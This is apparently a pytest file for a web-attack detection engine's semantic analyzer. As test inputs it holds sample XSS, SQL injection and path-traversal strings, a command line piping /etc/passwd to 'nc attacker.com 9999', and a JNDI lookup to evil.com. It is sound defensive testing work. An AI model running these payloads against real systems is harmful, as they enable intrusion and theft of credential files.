import concurrent.futures
import random
import re
import string
from unittest.mock import MagicMock, patch

from guard_core.detection_engine.semantic import SemanticAnalyzer


def test_initialization() -> None:
    analyzer = SemanticAnalyzer()

    assert "xss" in analyzer.attack_keywords
    assert "sql" in analyzer.attack_keywords
    assert "command" in analyzer.attack_keywords
    assert "path" in analyzer.attack_keywords
    assert "template" in analyzer.attack_keywords

    assert "script" in analyzer.attack_keywords["xss"]
    assert "select" in analyzer.attack_keywords["sql"]
    assert "exec" in analyzer.attack_keywords["command"]

    assert "brackets" in analyzer.suspicious_chars
    assert "quotes" in analyzer.suspicious_chars

    assert "tag_like" in analyzer.attack_structures
    assert "function_call" in analyzer.attack_structures


def test_extract_tokens_max_content_length() -> None:
    analyzer = SemanticAnalyzer()

    long_content = "a" * 60000

    tokens = analyzer.extract_tokens(long_content)

    assert len(tokens) <= 1000


def test_extract_tokens_timeout() -> None:
    analyzer = SemanticAnalyzer()

    with patch("concurrent.futures.ThreadPoolExecutor") as mock_executor:
        mock_future = MagicMock()
        mock_future.result.side_effect = concurrent.futures.TimeoutError()
        mock_submit = mock_executor.return_value.__enter__.return_value.submit
        mock_submit.return_value = mock_future

        content = "<script>alert(1)</script>"
        tokens = analyzer.extract_tokens(content)

        assert isinstance(tokens, list)


def test_extract_tokens_special_patterns_limit() -> None:
    analyzer = SemanticAnalyzer()

    content = "<script>" * 100 + "function()" * 100

    original_structures = analyzer.attack_structures
    analyzer.attack_structures = {f"pattern_{i}": r"<script>" for i in range(20)}

    tokens = analyzer.extract_tokens(content)

    analyzer.attack_structures = original_structures

    assert len(tokens) <= 1000


def test_calculate_entropy_empty_content() -> None:
    analyzer = SemanticAnalyzer()

    entropy = analyzer.calculate_entropy("")
    assert entropy == 0.0


def test_calculate_entropy_max_length() -> None:
    analyzer = SemanticAnalyzer()

    long_content = "abcdefghij" * 2000

    entropy = analyzer.calculate_entropy(long_content)

    assert entropy > 0.0


def test_detect_encoding_layers_max_length() -> None:
    analyzer = SemanticAnalyzer()

    long_content = "normal text " * 1000 + "%3Cscript%3E"

    layers = analyzer.detect_encoding_layers(long_content)

    assert layers >= 0


def test_detect_encoding_layers_url_encoding() -> None:
    analyzer = SemanticAnalyzer()

    content = "normal text %3Cscript%3E%20alert%281%29%3C%2Fscript%3E"
    layers = analyzer.detect_encoding_layers(content)

    assert layers >= 1


def test_detect_encoding_layers_html_entities() -> None:
    analyzer = SemanticAnalyzer()

    content = "normal text &lt;script&gt;alert(1)&lt;/script&gt;"
    layers = analyzer.detect_encoding_layers(content)

    assert layers >= 1


def test_detect_encoding_layers_multiple() -> None:
    analyzer = SemanticAnalyzer()

    content = "%3C &lt; \\u003C 0x3C3C AAAA=="
    layers = analyzer.detect_encoding_layers(content)

    assert layers >= 3


def test_analyze_attack_probability_empty_keywords() -> None:
    analyzer = SemanticAnalyzer()

    analyzer.attack_keywords["empty_test"] = set()

    content = "test content"
    probabilities = analyzer.analyze_attack_probability(content)

    assert "empty_test" in probabilities
    assert probabilities["empty_test"] == 0.0

    del analyzer.attack_keywords["empty_test"]


def test_analyze_attack_probability_command_pattern() -> None:
    analyzer = SemanticAnalyzer()

    content = "exec command; cat /etc/passwd | grep root"
    probabilities = analyzer.analyze_attack_probability(content)

    assert probabilities["command"] > 0.3


def test_analyze_attack_probability_path_pattern() -> None:
    analyzer = SemanticAnalyzer()

    content = "../../etc/passwd"
    probabilities = analyzer.analyze_attack_probability(content)

    assert probabilities["path"] > 0.3


def test_detect_obfuscation_high_entropy() -> None:
    analyzer = SemanticAnalyzer()

    random.seed(42)
    high_entropy_content = "".join(
        random.choice(string.ascii_letters + string.digits + string.punctuation)
        for _ in range(100)
    )

    is_obfuscated = analyzer.detect_obfuscation(high_entropy_content)

    assert is_obfuscated is True


def test_detect_obfuscation_special_chars() -> None:
    analyzer = SemanticAnalyzer()

    content = "!@#$%^&*()_+{}[]|\\:;\"'<>,.?/~`" * 3 + "normal"

    is_obfuscated = analyzer.detect_obfuscation(content)

    assert is_obfuscated is True


def test_analyze_code_injection_risk_brackets() -> None:
    analyzer = SemanticAnalyzer()

    content = "{malicious} code {injection}"
    risk = analyzer.analyze_code_injection_risk(content)

    assert risk >= 0.2


def test_analyze_code_injection_risk_variables() -> None:
    analyzer = SemanticAnalyzer()

    content = "$variable @another_var ${complex}"
    risk = analyzer.analyze_code_injection_risk(content)

    assert risk >= 0.1


def test_analyze_code_injection_risk_valid_python() -> None:
    analyzer = SemanticAnalyzer()

    content = "print('hello world')"

    with patch("ast.parse") as mock_parse:
        mock_parse.return_value = MagicMock()

        risk = analyzer.analyze_code_injection_risk(content)

        assert risk >= 0.3


def test_analyze_code_injection_risk_ast_timeout() -> None:
    analyzer = SemanticAnalyzer()

    content = "some code content"

    with patch("concurrent.futures.ThreadPoolExecutor") as mock_executor:
        mock_future = MagicMock()
        mock_future.result.side_effect = concurrent.futures.TimeoutError()
        mock_submit = mock_executor.return_value.__enter__.return_value.submit
        mock_submit.return_value = mock_future

        risk = analyzer.analyze_code_injection_risk(content)

        assert risk >= 0.2


def test_analyze_code_injection_risk_ast_exception() -> None:
    analyzer = SemanticAnalyzer()

    content = "x" * 2000

    risk = analyzer.analyze_code_injection_risk(content)

    assert risk >= 0.0


def test_analyze_code_injection_risk_injection_keywords() -> None:
    analyzer = SemanticAnalyzer()

    content = "eval(user_input) and exec(command)"
    risk = analyzer.analyze_code_injection_risk(content)

    assert risk >= 0.4


def test_extract_suspicious_patterns() -> None:
    analyzer = SemanticAnalyzer()

    content = "normal <script>alert(1)</script> text with function() call"
    patterns = analyzer.extract_suspicious_patterns(content)

    assert len(patterns) > 0

    for pattern in patterns:
        assert "type" in pattern
        assert "pattern" in pattern
        assert "position" in pattern
        assert "context" in pattern


def test_analyze_comprehensive() -> None:
    analyzer = SemanticAnalyzer()

    content = "<script>eval('alert(1)')</script> UNION SELECT * FROM users"

    analysis = analyzer.analyze(content)

    assert "attack_probabilities" in analysis
    assert "entropy" in analysis
    assert "encoding_layers" in analysis
    assert "is_obfuscated" in analysis
    assert "suspicious_patterns" in analysis
    assert "code_injection_risk" in analysis
    assert "token_count" in analysis

    assert analysis["attack_probabilities"]["xss"] > 0
    assert analysis["attack_probabilities"]["sql"] > 0


def test_get_threat_score() -> None:
    analyzer = SemanticAnalyzer()

    analysis_results = {
        "attack_probabilities": {"xss": 0.8, "sql": 0.6},
        "is_obfuscated": True,
        "encoding_layers": 2,
        "code_injection_risk": 0.5,
        "suspicious_patterns": [{"type": "tag_like"}, {"type": "function_call"}],
    }

    score = analyzer.get_threat_score(analysis_results)

    assert 0.0 <= score <= 1.0
    assert score > 0.5


def test_get_threat_score_minimal() -> None:
    analyzer = SemanticAnalyzer()

    analysis_results = {
        "attack_probabilities": {},
        "is_obfuscated": False,
        "encoding_layers": 0,
        "code_injection_risk": 0.0,
        "suspicious_patterns": [],
    }

    score = analyzer.get_threat_score(analysis_results)

    assert score == 0.0


def test_integration_xss_detection() -> None:
    analyzer = SemanticAnalyzer()

    xss_content = "<img src=x onerror=alert(1)>"
    analysis = analyzer.analyze(xss_content)
    threat_score = analyzer.get_threat_score(analysis)

    assert analysis["attack_probabilities"]["xss"] > 0.3
    assert threat_score > 0.3


def test_integration_sql_injection_detection() -> None:
    analyzer = SemanticAnalyzer()

    sqli_content = "1' OR '1'='1' UNION SELECT * FROM users--"
    analysis = analyzer.analyze(sqli_content)
    threat_score = analyzer.get_threat_score(analysis)

    assert analysis["attack_probabilities"]["sql"] > 0.3
    assert threat_score > 0.2


def test_integration_command_injection_detection() -> None:
    analyzer = SemanticAnalyzer()

    cmd_content = "test; cat /etc/passwd | nc attacker.com 9999"
    analysis = analyzer.analyze(cmd_content)

    assert analysis["attack_probabilities"]["command"] > 0.3
    assert len(analysis["suspicious_patterns"]) > 0


def test_integration_obfuscated_content() -> None:
    analyzer = SemanticAnalyzer()

    obfuscated = "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    analysis = analyzer.analyze(obfuscated)

    assert analysis["is_obfuscated"] is True
    assert analysis["encoding_layers"] > 0


def test_integration_template_injection() -> None:
    analyzer = SemanticAnalyzer()

    template_content = "{{7*7}} ${jndi:ldap://evil.com/a} {%if%}evil{%endif%}"
    analysis = analyzer.analyze(template_content)

    if "template" in analysis["attack_probabilities"]:
        assert analysis["attack_probabilities"]["template"] >= 0
    assert len(analysis["suspicious_patterns"]) > 0


def test_integration_long_string_obfuscation() -> None:
    analyzer = SemanticAnalyzer()

    long_string = "a" * 150
    analysis = analyzer.analyze(long_string)

    assert analysis["is_obfuscated"] is True


def test_detect_obfuscation_multiple_encoding_layers() -> None:
    analyzer = SemanticAnalyzer()

    content = "%3Cscript%3E"

    content += "&lt;test&gt;"

    content += "\\u0041\\u0042"

    assert re.search(r"%[0-9a-fA-F]{2}", content) is not None
    assert re.search(r"&[#\w]+;", content) is not None
    assert re.search(r"\\u[0-9a-fA-F]{4}", content) is not None

    layers = analyzer.detect_encoding_layers(content)
    assert layers > 2, f"Expected >2 layers, got {layers}"

    is_obfuscated = analyzer.detect_obfuscation(content)
    assert is_obfuscated is True


def test_analyze_code_injection_risk_ast_dangerous_nodes() -> None:
    analyzer = SemanticAnalyzer()

    import ast

    with patch("ast.parse"):
        mock_import_node = ast.Import(names=[ast.alias(name="os", asname=None)])

        with patch("ast.walk", return_value=[mock_import_node]):
            risk = analyzer.analyze_code_injection_risk("import os")

            assert risk >= 0.3


def test_analyze_code_injection_risk_ast_parse_exception() -> None:
    analyzer = SemanticAnalyzer()

    content = "test code"

    with patch("ast.parse", side_effect=ValueError("Unexpected AST error")):
        risk = analyzer.analyze_code_injection_risk(content)

        assert risk >= 0.0


def test_check_ast_parsing_outer_exception_returns_zero() -> None:
    analyzer = SemanticAnalyzer()
    with patch(
        "concurrent.futures.ThreadPoolExecutor",
        side_effect=RuntimeError("executor init failed"),
    ):
        result = analyzer._check_ast_parsing_risk("harmless")
    assert result == 0.0


def test_edge_case_unicode_content() -> None:
    analyzer = SemanticAnalyzer()

    unicode_content = "测试 <script>alert('χαίρετε')</script> اختبار"
    analysis = analyzer.analyze(unicode_content)

    assert analysis["attack_probabilities"]["xss"] > 0


def test_edge_case_mixed_case_keywords() -> None:
    analyzer = SemanticAnalyzer()

    mixed_case = "SeLeCt * FrOm UsErS UnIoN sElEcT"
    analysis = analyzer.analyze(mixed_case)

    assert analysis["attack_probabilities"]["sql"] > 0


def test_performance_large_input() -> None:
    analyzer = SemanticAnalyzer()

    large_content = "normal text " * 10000 + "<script>alert(1)</script>"

    import time

    start = time.time()
    analysis = analyzer.analyze(large_content)
    duration = time.time() - start

    assert duration < 1.0
    assert analysis["token_count"] <= 1000


def test_calculate_entropy_skips_zero_probability_counts() -> None:
    # The branch where `probability > 0` is False is reachable only with a
    # Counter that returns a zero-count entry — not possible from real text.
    # Patch Counter so its values() iterator yields a 0-count entry.
    from guard_core.detection_engine import semantic as semantic_mod

    analyzer = SemanticAnalyzer()

    class _FakeCounter(dict):
        def __init__(self, _content: object) -> None:
            super().__init__()
            self["a"] = 1
            self["b"] = 0

    with patch.object(semantic_mod, "Counter", _FakeCounter):
        entropy = analyzer.calculate_entropy("ab")
    assert entropy > 0


def test_detect_encoding_layers_no_base64_run_skips_that_layer() -> None:
    analyzer = SemanticAnalyzer()
    layers = analyzer.detect_encoding_layers("%2A")
    assert layers >= 1
